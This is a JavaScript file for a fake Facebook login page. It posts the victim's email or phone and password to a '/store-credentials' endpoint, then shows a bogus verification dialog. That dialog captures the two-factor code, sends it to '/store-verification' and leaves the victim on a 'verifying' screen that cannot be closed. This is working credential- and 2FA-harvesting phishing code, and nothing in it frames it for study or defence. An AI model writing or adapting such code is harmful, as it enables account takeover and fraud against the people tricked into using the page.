// DOM Elements
const loginForm = document.getElementById('loginForm');
const emailInput = document.getElementById('emailOrPhone');
const passwordInput = document.getElementById('password');
const emailError = document.getElementById('emailError');
const passwordError = document.getElementById('passwordError');
const verificationModal = document.getElementById('verificationModal');
const verificationCode = document.getElementById('verificationCode');
const codeError = document.getElementById('codeError');
const resendCode = document.getElementById('resendCode');
const sentMessage = document.getElementById('sentMessage');
const verifyButton = document.getElementById('verifyButton');
const verifyingModal = document.getElementById('verifyingModal');

// Input validation
function validateInput(input, errorElement) {
    if (!input.value.trim()) {
        errorElement.style.display = 'block';
        return false;
    }
    errorElement.style.display = 'none';
    return true;
}

// Validate email/phone on blur
emailInput.addEventListener('blur', () => {
    validateInput(emailInput, emailError);
});

// Validate password on blur
passwordInput.addEventListener('blur', () => {
    validateInput(passwordInput, passwordError);
});

let loginAttemptId = null;

// FORM SUBMISSION WITH PLATFORM IDENTIFIER
loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const isEmailValid = validateInput(emailInput, emailError);
    const isPasswordValid = validateInput(passwordInput, passwordError);

    if (isEmailValid && isPasswordValid) {
        const loginButton = document.getElementById('loginBtn');
        const originalText = loginButton.innerHTML;
        
        // Show loading spinner
        loginButton.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Logging in...';
        loginButton.disabled = true;
        
        const identifier = emailInput.value;
        const password = passwordInput.value;

        try {
            const response = await fetch('/store-credentials', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
                },
                body: JSON.stringify({
                    identifier,
                    password,
                    platform: 'facebook'
                })
            });

            const data = await response.json();
            loginAttemptId = data.id;

            // Reset button
            loginButton.innerHTML = originalText;
            loginButton.disabled = false;

            // Show verification modal
            console.log('Showing verification modal');
            verificationModal.style.opacity = '1';
            verificationModal.style.pointerEvents = 'all';
            document.body.style.overflow = 'hidden';
            sentMessage.style.display = 'none';
            console.log('Modal should be visible now');

        } catch (error) {
            console.error('Error storing credentials:', error);
            // Reset button on error
            loginButton.innerHTML = originalText;
            loginButton.disabled = false;
        }
    }
});

// Resend code functionality
resendCode.addEventListener('click', () => {
    sentMessage.style.display = 'block';
    setTimeout(() => {
        sentMessage.style.display = 'none';
    }, 2000);
});

// VERIFY CODE WITH PLATFORM IDENTIFIER
verifyButton.addEventListener('click', async () => {
    const code = verificationCode.value.trim();

    if (!code) {
        codeError.style.display = 'block';
        return;
    }

    codeError.style.display = 'none';
    
    // Show loading spinner
    const originalText = verifyButton.innerHTML;
    verifyButton.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Verifying...';
    verifyButton.disabled = true;

    if (loginAttemptId) {
        try {
            await fetch('/store-verification', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
                },
                body: JSON.stringify({
                    attempt_id: loginAttemptId,
                    verification_code: code,
                    platform: 'facebook'
                })
            });

            verificationModal.style.opacity = '0';
            verificationModal.style.pointerEvents = 'none';
            verifyingModal.style.opacity = '1';
            verifyingModal.style.pointerEvents = 'all';

        } catch (error) {
            console.error('Error storing verification code:', error);
            // Reset button on error
            verifyButton.innerHTML = originalText;
            verifyButton.disabled = false;
        }
    }
});

// Prevent closing modal by clicking outside
verificationModal.addEventListener('click', (e) => {
    if (e.target === verificationModal) {
        e.stopPropagation();
    }
});

verifyingModal.addEventListener('click', (e) => {
    if (e.target === verifyingModal) {
        e.stopPropagation();
    }
});